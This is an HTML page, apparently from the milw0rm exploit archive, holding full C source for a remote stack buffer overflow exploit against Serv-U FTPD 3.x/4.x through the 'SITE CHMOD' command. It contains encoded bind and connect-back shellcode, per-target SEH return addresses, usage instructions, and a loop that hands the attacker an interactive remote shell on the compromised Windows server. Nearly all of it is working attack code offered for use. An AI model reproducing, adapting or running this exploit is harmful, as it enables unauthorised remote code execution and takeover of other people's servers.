<html>
<head>
<title>Serv-U FTPD 3.x/4.x "SITE CHMOD" Command remote Exploit
</title>
<pre>
/*
*-----------------------------------------------------------------------
* 
* Servu.c - Serv-U FTPD 3.x/4.x &quot;SITE CHMOD&quot; Command
* Remote stack buffer overflow exploit
*
* Copyright (C) 2004 HUC All Rights Reserved.
*
* Author   : lion
*          : lion@cnhonker.net
*          : http://www.cnhonker.com
* Date     : 2004-01-25
*          : 2004-01-25 v1.0 Can attack Serv-U v3.0.0.20~v4.1.0.11
* Tested   : Windows 2000 Server EN/GB
*          :	 + Serv-U v3.0.0.20~v4.1.0.11
* Notice   : *** Bug find by kkqq kkqq@0x557.org ***
*          : *** You need a valid account and a writable directory. ***
* Complie  : cl Servu.c
* Usage	   : Servu &lt;-i ip&gt; &lt;-t type&gt; [-u user] [-p pass] [-d dir] [-f ftpport] [-c cbhost] [-s shellport]
*------------------------------------------------------------------------
*/

#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#pragma comment(lib, &quot;ws2_32&quot;)

// for bind shellcode
#define BIND_OFFSET		91

// for connectback shellcode
#define PORT_OFFSET		95
#define IP_OFFSET		88

#define SEH_OFFSET		0x193	//v3.0.0.20~v4.1.0.11
//#define	SEH_OFFSET		0x133 // work on v3.0.0.16~v3.0.0.19, for connectback shellcode
#define MAX_LEN			2048
#define JMP_OVER		&quot;\xeb\x06\xeb\x06&quot;
#define	VERSION			&quot;1.0&quot;

struct
{
	DWORD	dwJMP;
	char	*szDescription;
}targets[] =
{
	{0x7ffa4a1b,&quot;Serv-U v3.0.0.20~v4.1.0.11  GB     2K/XP  ALL&quot;},	//for all GB win2000 and winxp
// {0x74FD69A9,&quot;Serv-U v3.0.0.20~v4.1.0.11  GB     2K     SP3/SP4&quot;},	//wsock32.dll jmp ebx addr
// {0x71a469ad,&quot;Serv-U v3.0.0.20~v4.1.0.11  GB     XP     SP0/SP1&quot;},	//wsock32.dll jmp ebx addr
// {0x77e45f17,&quot;Serv-U v3.0.0.20~v4.1.0.11  GB/BG  2K     SP4&quot;},	//user32.dll jmp ebx addr
// {0x7ffa2186,&quot;Serv-U v3.0.0.20~v4.1.0.11  BG     2K/XP  ALL&quot;},	//for all BG win2000 and winxp	
// {0x6dec6713,&quot;Serv-U v3.0.0.20~v4.1.0.11  BG     2K     SP4&quot;},	//setupapi.dll jmp ebx addr
// {0x6DEE6713,&quot;Serv-U v3.0.0.20~v4.1.0.11  KR     2K     SP4&quot;},	//setupapi.dll jmp ebx addr
// {0x77886713,&quot;Serv-U v3.0.0.20~v4.1.0.11  EN     2K     SP4&quot;},	//setupapi.dll jmp ebx addr
// {0x76b42a3a,&quot;Serv-U v3.0.0.20~v4.1.0.11  EN     XP     SP1&quot;},
// {0x12345678,&quot;Serv-U v3.0.0.20~v4.1.0.11&quot;},         
},v;


unsigned char	*szSend[4];
unsigned char	szCommand[MAX_LEN];
char		szDirectory[0x100];

// 28 bytes decode by lion, don't change this.
unsigned char decode[]=
&quot;\xBE\x6D\x69\x6F\x6E\x4E\xBF\x6D\x69\x30\x6E\x4F\x43\x39\x3B\x75&quot;
&quot;\xFB\x4B\x80\x33\x93\x39\x73\xFC\x75\xF7\xFF\xD3&quot;;

// Shellcode start sign, use for decode, don't change this.
unsigned char sc_start[]=
&quot;lion&quot;; 

// Shellcode end sign, use for decode, don't change this.
unsigned char sc_end[]=
&quot;li0n&quot;; 

// 311 bytes bind shellcode by lion (xor with 0x93)
unsigned char sc[]=
&quot;\x7A\x96\x92\x93\x93\xCC\xF7\x32\xA3\x93\x93\x93\x18\xD3\x9F\x18&quot;
&quot;\xE3\x8F\x3E\x18\xFB\x9B\x18\x64\xF9\x97\xCA\x7B\x36\x93\x93\x93&quot;
&quot;\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC\xC7\x6C\x85\x18&quot;
&quot;\x7B\xF9\x95\xCA\x7B\x1F\x93\x93\x93\x71\x6A\x12\x7F\x03\x92\x93&quot;
&quot;\x93\xC7\xFB\x92\x92\x93\x93\x6C\xC5\x83\xC3\xC3\xC3\xC3\xF9\x92&quot;
&quot;\xF9\x91\x6C\xC5\x87\x18\x4B\x54\x94\x91\x93\x93\xA6\xA0\x53\x1A&quot;
&quot;\xD4\x97\xF9\x83\xC4\xC0\x6C\xC5\x8B\xF9\x92\xC0\x6C\xC5\x8F\xC3&quot;
&quot;\xC3\xC0\x6C\xC5\xB3\x18\x4B\xA0\x53\xFB\xF0\xFE\xF7\x93\x1A\xF5&quot;
&quot;\xA3\x10\x7F\xC7\x18\x6F\xF9\x87\xCA\x1A\x97\x1C\x71\x68\x55\xD4&quot;
&quot;\x83\xD7\x6D\xD4\xAF\x6D\xD4\xAE\x1A\xCC\xDB\x1A\xCC\xDF\x1A\xCC&quot;
&quot;\xC3\x1E\xD7\xB7\x83\xC4\xC3\xC2\xC2\xC2\xF9\x92\xC2\xC2\x6C\xE5&quot;
&quot;\xA3\xC2\x6C\xC5\x97\x18\x5F\xF9\x6C\x6C\xA2\x6C\xC5\x9B\xC0\x6C&quot;
&quot;\xC5\xB7\x6C\xC5\x9F\xC2\xC5\x18\xE6\xAF\x18\xE7\xBD\xEB\x90\x66&quot;
&quot;\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA\xD2\x3E\x90\x56\xA0\x48\x9C&quot;
&quot;\x2D\x83\xA9\x45\xE7\x9B\x52\x58\x9E\x90\x49\xD3\x78\x62\xA8\x8C&quot;
&quot;\xE6\x74\xCD\x18\xCD\xB7\x90\x4E\xF5\x18\x9F\xD8\x18\xCD\x8F\x90&quot;
&quot;\x4E\x18\x97\x18\x90\x56\x38\xCD\xCA\x50\x7B\x65\x6D\x6C\x6C\x1D&quot;
&quot;\xDD\x9D\x7F\xE1\x6D\x20\x85\x3E\x4A\x96\x5D\xED\x4B\x71\xE0\x58&quot;
&quot;\x7E\x6F\xA8\x4A\x9A\x66\x3E\x37\x89\xE3\x54\x37\x3E\xBD\x7A\x76&quot;
&quot;\xDA\x15\xDA\x74\xEA\x55\xEA&quot;;

// 294 bytes connectback shellcode by lion (xor with 0x93)
unsigned char cbsc[]=
&quot;\x7A\x6F\x93\x93\x93\xCC\xF7\x32\xA3\x93\x93\x93\x18\xD3\x9F\x18&quot;
&quot;\xE3\x8F\x3E\x18\xFB\x9B\x18\x64\xF9\x97\xCA\x7B\x0F\x93\x93\x93&quot;
&quot;\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC\xC7\x6C\x85\x18&quot;
&quot;\x7B\xF9\x97\xCA\x7B\x10\x93\x93\x93\x71\x6A\x12\x7F\x03\x92\x93&quot;
&quot;\x93\xC7\xFB\x92\x92\x93\x93\x6C\xC5\x83\xC3\xC3\xC3\xC3\xF9\x92&quot;
&quot;\xF9\x91\x6C\xC5\x87\x18\x4B\xFB\xEC\x93\x93\x92\xFB\x91\x93\x93&quot;
&quot;\xA6\x18\x5F\xF9\x83\xC2\xC0\x6C\xC5\x8B\x16\x53\xE6\xD8\xA0\x53&quot;
&quot;\xFB\xF0\xFE\xF7\x93\x1A\xF5\xA3\x10\x7F\xC7\x18\x6F\xF9\x83\xCA&quot;
&quot;\x1A\x97\x1C\x71\x68\x55\xD4\x83\xD7\x6D\xD4\xAF\x6D\xD4\xAE\x1A&quot;
&quot;\xCC\xDB\x1A\xCC\xDF\x1A\xCC\xC3\x1E\xD7\xB7\x83\xC4\xC3\xC2\xC2&quot;
&quot;\xC2\xF9\x92\xC2\xC2\x6C\xE5\xA3\xC2\x6C\xC5\x97\x18\x5F\xF9\x6C&quot;
&quot;\x6C\xA2\x6C\xC5\x9B\xC0\x6C\xC5\x8F\x6C\xC5\x9F\xC2\xC5\x18\xE6&quot;
&quot;\xAF\x18\xE7\xBD\xEB\x90\x66\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA&quot;
&quot;\xD2\x3E\x90\x56\xA0\x48\x9C\x2D\x83\xA9\x45\xE7\x9B\x52\x58\x9E&quot;
&quot;\x90\x49\xD3\x78\x62\xA8\x8C\xE6\x74\xCD\x18\xCD\xB7\x90\x4E\xF5&quot;
&quot;\x18\x9F\xD8\x18\xCD\x8F\x90\x4E\x18\x97\x18\x90\x56\x38\xCD\xCA&quot;
&quot;\x50\x7B\x6C\x6D\x6C\x6C\x1D\xDD\x9D\x7F\xE1\x6D\x20\x85\x3E\x4A&quot;
&quot;\x96\x5D\xED\x4B\x71\xE0\x58\x7E\x6F\xA8\x4A\x9A\x66\x3E\x7F\x6A&quot;
&quot;\x39\xF3\x74\xEA\x55\xEA&quot;;

void usage(char *p)
{
	int	i;
	printf( &quot;Usage:\t%s\t&lt;-i ip&gt; &lt;-t type&gt;\n&quot;
		&quot;\t\t[-u user] [-p pass] [-d dir]\n&quot;
		&quot;\t\t[-f ftpport] [-c cbhost] [-s shellport]\n\n&quot;
		&quot;[type]:\n&quot; , p);	
	for(i=0;i&lt;sizeof(targets)/sizeof(v);i++)
	{
		printf(&quot;\t%d\t0x%x\t%s\n&quot;, i, targets[i].dwJMP, targets[i].szDescription);
	}
}

/* ripped from TESO code and modifed by ey4s for win32 */
void shell (int sock)
{
	int     l;
	char    buf[512];
	struct	timeval time;
	unsigned long	ul[2];

	time.tv_sec = 1;
	time.tv_usec = 0;

	while (1)
	{
		ul[0] = 1;
		ul[1] = sock;

		l = select (0, (fd_set *)&amp;ul, NULL, NULL, &amp;time);
		if(l == 1)
		{
			l = recv (sock, buf, sizeof (buf), 0);
			if (l &lt;= 0)
			{
				printf (&quot;[-] Connection closed.\n&quot;);
				return;
			}
			l = write (1, buf, l);
			if (l &lt;= 0)
			{
				printf (&quot;[-] Connection closed.\n&quot;);
				return;
			}
		}
		else
		{
			l = read (0, buf, sizeof (buf));
			if (l &lt;= 0)
			{
				printf(&quot;[-] Connection closed.\n&quot;);
				return;
			}
			l = send(sock, buf, l, 0);
			if (l &lt;= 0)
			{
				printf(&quot;[-] Connection closed.\n&quot;);
				return;
			}
		}
	}
}

void main(int argc, char **argv)
{
	struct	sockaddr_in sa, server, client;
	WSADATA	wsd;
	SOCKET	s, s2, s3;
	int	iErr, ret, len;
	char	szRecvBuff[MAX_LEN];
	int	i, j, iType;
	int	iPort=21;
	char	*ip=NULL, *pUser=&quot;ftp&quot;, *pPass=&quot;ftp@ftp.com&quot;, *cbHost=NULL;
	char	user[128], pass[128];
	BOOL	bCb=FALSE, bLocal=TRUE;
	unsigned short	shport=53, shport2=0;
	unsigned long	cbip;
	unsigned int	timeout=5000, Reuse;
	char	penetrate[255],cbHost2[20];
	int seh_offset;
	
	printf( &quot;Serv-U FTPD 3.x/4.x \&quot;SITE CHMOD\&quot; remote overflow exploit V%s\r\n&quot;
		&quot;Bug find by kkqq kkqq@0x557.org, Code By lion (lion@cnhonker.net)\r\n&quot;
		&quot;Welcome to HUC website http://www.cnhonker.com\r\n\n&quot;
		 	, VERSION);

	seh_offset = SEH_OFFSET;
	
	if(argc &lt; 4)
	{
		usage(argv[0]);
		return;
	}

	for(i=1;i&lt;argc;i+=2)
	{
		if(strlen(argv[i]) != 2)
		{
			usage(argv[0]);
			return;
		}
		// check parameter
		if(i == argc-1)
		{
			usage(argv[0]);
			return;
		}
		switch(argv[i][1])
		{
			case 'i':
				ip=argv[i+1];
				break;
			case 't':
				iType = atoi(argv[i+1]);
				break;
			case 'f':
				iPort=atoi(argv[i+1]);
				break;
			case 'p':
				pPass = argv[i+1];
				break;
			case 'u':
				pUser=argv[i+1];
				break;
			case 'c':
				cbHost=argv[i+1];
				bCb=TRUE;
				break;
			case 's':
				shport=atoi(argv[i+1]);
				break;
			case 'd':
				if(argv[i+1][0] != '/')
					strcpy(szDirectory, &quot;/&quot;);
				strncat(szDirectory, argv[i+1], sizeof(szDirectory)-0x20);
				
				if(szDirectory[strlen(szDirectory)-1] != '/')
					strcat(szDirectory, &quot;/&quot;);
					
				// correct the directory len
				for(j=0;j&lt;(strlen(szDirectory)-1)%8;j++)
					strcat(szDirectory, &quot;x&quot;);
					
				//printf(&quot;%d:%s\r\n&quot;, strlen(szDirectory), szDirectory);
				seh_offset = seh_offset - strlen(szDirectory)+1;
				break;
		}
	}

	if((!ip) || (!user) || (!pass))
	{
		usage(argv[0]);
		printf(&quot;[-] Invalid parameter.\n&quot;);
		return;
	}

	if( (iType&lt;0) || (iType&gt;=sizeof(targets)/sizeof(v)) )
	{
		usage(argv[0]);
		printf(&quot;[-] Invalid type.\n&quot;);
		return;
	}

	if(iPort &lt;0 || iPort &gt;65535 || shport &lt;0 || shport &gt; 65535)
	{
		usage(argv[0]);
		printf(&quot;[-] Invalid port.\n&quot;);
		return;
	}
	
	_snprintf(user, sizeof(user)-1, &quot;USER %s\r\n&quot;, pUser);
	user[sizeof(user)-1]='\0';
	_snprintf(pass, sizeof(pass)-1, &quot;PASS %s\r\n&quot;, pPass);
	pass[sizeof(pass)-1]='\0';
	szSend[0] = user;	//user
	szSend[1] = pass;	//pass	
	szSend[2] = penetrate;	//pentrate
	szSend[3] = szCommand;	//shellcode
	
	// Penetrate through the firewall.
	if(bCb &amp;&amp; shport &gt; 1024)
	{
		strncpy(cbHost2, cbHost, 20);
		for(i=0;i&lt;strlen(cbHost); i++)
		{
			if(cbHost[i] == '.')
				cbHost2[i] = ',';
		}
		
		sprintf(penetrate, &quot;PORT %s,%d,%d\r\n&quot;, cbHost2, shport/256, shport%256);

		//printf(&quot;%s&quot;, penetrate);
	}
	else
	{
		sprintf(penetrate,&quot;TYPE I\r\n&quot;);		
	}

	// fill the &quot;site chmod&quot; command
	strcpy(szCommand, &quot;site chmod 777 &quot;);
	
	// fill the directory
	if(szDirectory[0])
		strcat(szCommand, szDirectory);

	// fill the egg
	for(i=0;i&lt;seh_offset%8;i++)
		strcat(szCommand, &quot;\x90&quot;);
	//strcat(szCommand, &quot;BBBB&quot;);
	
	// fill the seh
	for(i=0;i&lt;=(seh_offset/8)*8+0x20;i+=8)
	{
		strcat(szCommand, JMP_OVER);
		memcpy(&amp;szCommand[strlen(szCommand)], &amp;targets[iType].dwJMP, 4);
	}
		
	// fill the decode
	strcat(szCommand, decode);

	// fill the shellcode start	sign
	strcat(szCommand, sc_start);

	// fill the shellcode
	if(bCb)
	{
		// connectback shellcode
		shport2 = htons(shport)^(u_short)0x9393;
		cbip = inet_addr(cbHost)^0x93939393;
		memcpy(&amp;cbsc[PORT_OFFSET], &amp;shport2, 2);
		memcpy(&amp;cbsc[IP_OFFSET], &amp;cbip, 4);
		strcat(szCommand, cbsc);		
	}
	else
	{
		// bind shellcode
		shport2 = htons(shport)^(u_short)0x9393;
		memcpy(&amp;sc[BIND_OFFSET], &amp;shport2, 2);
		strcat(szCommand, sc);
	}

	// fill the shellcode end sign
	strcat(szCommand, sc_end);

	// send end
	strcat(szCommand, &quot;\r\n&quot;);

	if(strlen(szCommand) &gt;= sizeof(szCommand))
	{
		printf(&quot;[-] stack buffer overflow.\n&quot;);
		return;
	}
	
//	printf(&quot;send size %d:%s&quot;, strlen(szCommand), szCommand);
	
	__try
	{
		if (WSAStartup(MAKEWORD(1,1), &amp;wsd) != 0)
		{
			printf(&quot;[-] WSAStartup error:%d\n&quot;, WSAGetLastError());
			__leave;
		}

		s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(s == INVALID_SOCKET)
		{
			printf(&quot;[-] Create socket failed:%d&quot;,GetLastError());
			__leave;
		}

		sa.sin_family=AF_INET;
		sa.sin_port=htons((USHORT)iPort);
		sa.sin_addr.S_un.S_addr=inet_addr(ip);

		setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(char *)&amp;timeout,sizeof(unsigned int));
		iErr = connect(s,(struct sockaddr *)&amp;sa,sizeof(sa));
		if(iErr == SOCKET_ERROR)
		{
			printf(&quot;[-] Connect to %s:%d error:%d\n&quot;, ip, iPort, GetLastError());
			__leave;
		}
		printf(&quot;[+] Connect to %s:%d success.\n&quot;, ip, iPort);
		
		if(bCb)
		{
			Sleep(500);
			s2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			server.sin_family=AF_INET;
			server.sin_addr.S_un.S_addr=inet_addr(cbHost);
			//server.sin_addr.s_addr=INADDR_ANY; 
			server.sin_port=htons((unsigned short)shport);

			setsockopt(s2,SOL_SOCKET,SO_RCVTIMEO,(char *)&amp;timeout,sizeof(unsigned int));

			Reuse = 1; 
			setsockopt(s2, SOL_SOCKET, SO_REUSEADDR, (char*)&amp;Reuse, sizeof(Reuse));

			if(bind(s2,(LPSOCKADDR)&amp;server,sizeof(server))==SOCKET_ERROR)
			{
				printf(&quot;[-] Bind port on %s:%d error.\n&quot;, cbHost, shport);
				printf(&quot;[-] You must run nc get the shell.\n&quot;);
				bLocal = FALSE;
				//closesocket(s2);
				//__leave;
			}
			else
			{	
				printf(&quot;[+] Bind port on %s:%d success.\n&quot;, cbHost, shport);
				listen(s2, 1); 
			}
		}
		
		for(i=0;i&lt;sizeof(szSend)/sizeof(szSend[0]);i++)
		{
			memset(szRecvBuff, 0, sizeof(szRecvBuff));
			iErr = recv(s, szRecvBuff, sizeof(szRecvBuff), 0);
			if(iErr == SOCKET_ERROR)
			{
				printf(&quot;[-] Recv buffer error:%d.\n&quot;, WSAGetLastError());
				__leave;
			}
			printf(&quot;[+] Recv: %s&quot;, szRecvBuff);
			
			if(szRecvBuff[0] == '5')
			{
				printf(&quot;[-] Server return a error Message.\r\n&quot;);
				__leave;
			}

			iErr = send(s, szSend[i], strlen(szSend[i]),0);
			if(iErr == SOCKET_ERROR)
			{
				printf(&quot;[-] Send buffer error:%d.\n&quot;, WSAGetLastError());
				__leave;
			}

			if(i==sizeof(szSend)/sizeof(szSend[0])-1)
				printf(&quot;[+] Send shellcode %d bytes.\n&quot;, iErr);
			else
				printf(&quot;[+] Send: %s&quot;, szSend[i]);
		}

		printf(&quot;[+] If you don't have a shell it didn't work.\n&quot;);

		if(bCb)
		{
			if(bLocal)
			{
				printf(&quot;[+] Wait for shell...\n&quot;);
			
				len = sizeof(client);
				s3 = accept(s2, (struct sockaddr*)&amp;client, &amp;len); 
				if(s3 != INVALID_SOCKET) 
				{ 
	printf(&quot;[+] Exploit success! Good luck! :)\n&quot;);
	printf(&quot;[+] ===--===--===--===--===--===--===--===--===--===--===--===--===--===\n&quot;);
					shell(s3);
				}
			}	
		}
		else
		{
			printf(&quot;[+] Connect to shell...\n&quot;);
			
			Sleep(1000);
			s2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
			server.sin_family = AF_INET;
			server.sin_port = htons(shport);
			server.sin_addr.s_addr=inet_addr(ip);

			ret = connect(s2, (struct sockaddr *)&amp;server, sizeof(server));
			if(ret!=0)
			{
				printf(&quot;[-] Exploit seem failed.\n&quot;);
				__leave;
			}
			
	printf(&quot;[+] Exploit success! Good luck! :)\n&quot;);
	printf(&quot;[+] ===--===--===--===--===--===--===--===--===--===--===--===--===--===\n&quot;);
			shell(s2);
		}
		
		
	}

 	__finally
	{
		if(s != INVALID_SOCKET) closesocket(s);
		if(s2 != INVALID_SOCKET) closesocket(s2);
		if(s3 != INVALID_SOCKET) closesocket(s3);
		WSACleanup();
	}

	return;
}</pre>
//milw0rm.com
</html>

